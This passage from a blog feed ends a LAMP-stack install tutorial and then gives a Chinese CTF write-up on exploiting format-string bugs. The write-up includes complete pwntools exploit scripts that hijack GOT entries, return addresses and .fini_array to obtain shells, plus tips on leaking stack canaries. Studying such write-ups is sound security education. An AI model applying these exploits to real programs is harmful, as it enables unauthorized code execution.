php-5.4.25]# ./configure <span class="hljs-attribute">--prefix</span>=/usr/local/php/ <span class="hljs-attribute">--with-config-file-path</span>=/usr/local/php/etc/ <span class="hljs-attribute">--with-apxs2</span>=/usr/local/apache2/bin/apxs <span class="hljs-attribute">--with-mysql</span>=/usr/local/mysql <span class="hljs-attribute">--with-libxml-dir</span>=/usr/local/libxml2 <span class="hljs-attribute">--with-jpeg-dir</span>=/usr/local/jpeg6/ <span class="hljs-attribute">--with-png-dir</span>=/usr/local/libpng/ <span class="hljs-attribute">--with-freetype-dir</span>=/usr/local/freetype/ <span class="hljs-attribute">--with-gd</span>=/usr/local/gd2/ <span class="hljs-attribute">--with-mcrypt</span>=/usr/local/libmcrypt/ <span class="hljs-attribute">--with-mysqli</span>=/usr/local/mysql/bin/mysql_config --enable-soap <span class="hljs-attribute">--enable-mbstring</span>=all --enable-sockets <span class="hljs-attribute">--with-pdo-mysql</span>=/usr/local/mysql --without-pear</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# make</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# make install</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# mkdir /usr/local/php/etc[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre></div><p>复制主配置文件到<code>/usr/local/php/etc</code></p><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# vi /usr/local/apache2/etc/httpd.conf</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>修改apache2配置，让其也可以支持php</p><p>重启apache2:</p><div class="hljs"><pre><code class="hljs undefined">[root@localhost php<span class="hljs-number">-5.4</span><span class="hljs-number">.25</span>]# /usr/<span class="hljs-keyword">local</span>/apache2/bin/apachectl stopAH00558: httpd: Could <span class="hljs-keyword">not</span> reliably determine the <span class="hljs-keyword">server</span><span class="hljs-string">'s fully qualified domain name, using localhost.localdomain. Set the '</span>ServerNam<span class="hljs-string">e' directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server'</span>s fully qualified <span class="hljs-keyword">domain</span> <span class="hljs-type">name</span>, <span class="hljs-keyword">using</span> localhost.localdomain. <span class="hljs-keyword">Set</span> the <span class="hljs-string">'ServerName'</span> directive globally <span class="hljs-keyword">to</span> suppress this message</code></pre></div><p>restart 可能是无效的。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h4 id="apache与php"><a href="#apache与php" class="headerlink" title="apache与php"></a>apache与php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">[root<span class="hljs-symbol">@localhost</span> htdocs]<span class="hljs-meta"># vi index.php</span></code></pre></div><p>写一个php探针：</p><div class="hljs"><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>        phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apache与MySQL"><a href="#apache与MySQL" class="headerlink" title="apache与MySQL"></a>apache与MySQL</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$link=mysql_connect(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'123456'</span>);<span class="hljs-keyword">if</span>($link) <span class="hljs-keyword">echo</span> <span class="hljs-string">"Congratulations!!!!!!"</span>;mysql_close();<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadmin搭建"><a href="#phpadmin搭建" class="headerlink" title="phpadmin搭建"></a>phpadmin搭建</h3><div class="hljs"><pre><code class="hljs undefined">[<span class="hljs-symbol">root@</span>localhost lamp1]# cp -r phpMyAdmin<span class="hljs-number">-4.1</span><span class="hljs-number">.4</span>-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre></div><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-attr">[root@localhost phpmyadmin]</span># <span class="hljs-selector-tag">cp</span> <span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.sample</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span> <span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-attr">[root@localhost phpmyadmin]</span># <span class="hljs-selector-tag">vi</span> <span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>访问测试：<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞小总结（下）</title>
    <link href="/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p><h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul><li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li><li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li><li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li><li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li><li>在栈上构造出printf函数GOT表的地址</li><li>利用fmt漏洞修改printf函数GOT表上的地址</li></ul><p>然后看一个例题：</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __cdecl __<span class="hljs-function">noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-10Ch]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-keyword">do</span>  &#123;    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-built_in">printf</span>(&amp;s);  &#125;  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );  system(<span class="hljs-string">"echo Goodbye"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p><h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul><li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li><li>改这个GOT上的地址为system函数的plt</li><li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li></ul><p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p><h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ stack <span class="hljs-number">0x20</span><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd250</span> --&gt; <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd254</span> --&gt; <span class="hljs-number">0x100</span><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd258</span> --&gt; <span class="hljs-number">0xf7fb25a0</span> --&gt; <span class="hljs-number">0xfbad208b</span><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd25c</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd260</span> --&gt; <span class="hljs-number">0xf7ffd000</span> --&gt; <span class="hljs-number">0x23f40</span><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd264</span> --&gt; <span class="hljs-number">0x80482e7</span> (<span class="hljs-string">"__libc_start_main"</span>)<span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd268</span> --&gt; <span class="hljs-number">0xf63d4e2e</span><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)</code></pre></div><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ fmtarg <span class="hljs-number">0xffffd26c</span>The <span class="hljs-keyword">index</span> of <span class="hljs-keyword">format</span> argument : <span class="hljs-number">7</span> (<span class="hljs-string">"\%6$p"</span>)</code></pre></div><p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x08048400</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">15</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + p32(printf_got) + p32(printf_got+<span class="hljs-number">2</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span>payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;printf_got : system_plt&#125;)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p><h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p><ul><li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li><li>不开nx保护，jmp到自己构造的shellcode上。</li><li>提前泄漏libc算出libc的base，jmp到onegadget地址</li></ul><p>看一个简单的例子：</p><h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">fastcall <span class="hljs-title">sub_400B07</span><span class="hljs-params">(<span class="hljs-keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="hljs-keyword">char</span> formata, __int64 a8, __int64 a9)</span></span>&#123;  write(<span class="hljs-number">0</span>, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>, <span class="hljs-number">0x1A</span>uLL);  <span class="hljs-built_in">printf</span>(&amp;formata, <span class="hljs-string">"Welc0me to sangebaimao!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;a9 + <span class="hljs-number">4</span>);&#125;</code></pre></div><p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p><h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p><p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p><p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./pwnme_k0'</span>)<span class="hljs-comment"># context.clear(arch = 'amd64')</span>io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'%0006$lx'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(<span class="hljs-string">'11111111'</span>)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)<span class="hljs-comment"># io.recvuntil('Welc0me to sangebaimao!\n')</span>stack = int(io.recvline_contains(<span class="hljs-string">'7f'</span>),<span class="hljs-number">16</span>)print(stack)ret_add = stack - <span class="hljs-number">0x38</span><span class="hljs-comment"># system_add = 0x04008AA</span>payload = <span class="hljs-string">'%2218c%8$hn'</span>io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'2'</span>)io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(p64(ret_add))io.recvuntil(<span class="hljs-string">'lenth:20): \n'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'&gt;'</span>)io.sendline(<span class="hljs-string">'1'</span>)io.interactive()</code></pre></div><h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p><p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Ch] [ebp-84h]</span>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+5Ch] [ebp-44h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+9Ch] [ebp-4h]</span>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please tell me your name... "</span>);  <span class="hljs-keyword">if</span> ( !getnline(&amp;v5, <span class="hljs-number">64</span>) )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Don't ignore me ;( "</span>);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"Nice to meet you, %s :)\n"</span>, &amp;v5);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;s);&#125;</code></pre></div><p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> __<span class="hljs-function">cdecl <span class="hljs-title">getnline</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s, <span class="hljs-keyword">int</span> n)</span></span>&#123;  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>  fgets(s, n, <span class="hljs-built_in">stdin</span>);  v3 = <span class="hljs-built_in">strchr</span>(s, <span class="hljs-number">10</span>);  <span class="hljs-keyword">if</span> ( v3 )    *v3 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strlen</span>(s);&#125;</code></pre></div><p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p><ul><li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li><li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li><li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li></ul><p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p><h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"Nice to meet you, %s :)\n"</span>, &amp;v5);</code></pre></div><p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./greeting'</span>)<span class="hljs-comment"># io = remote('111.198.29.45',42729)</span>elf = ELF(<span class="hljs-string">'./greeting'</span>)strlen_got = <span class="hljs-number">0x08049A54</span>fini_array = <span class="hljs-number">0x08049934</span>start = <span class="hljs-number">0x080484F0</span>system_plt = <span class="hljs-number">0x08048490</span>offset = <span class="hljs-number">12</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultkey1 = <span class="hljs-number">0x08048490</span>prev = <span class="hljs-number">18</span> <span class="hljs-comment">#注意这个题在可控格式化字符串前有字符输出</span>payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):    payload +=fmt_short(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">24</span>+i)     prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>key2 = <span class="hljs-number">0x84F0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmt_short(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">26</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x32</span>,<span class="hljs-string">'a'</span>)payload += p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) +p32(fini_array)io.recvuntil(<span class="hljs-string">'name...'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'name...'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p><h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p><ul><li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li><li>sprintf：可以用%xxc 来造成新的buffer overflow </li></ul><h4 id="劫持-stack-chk-fail"><a 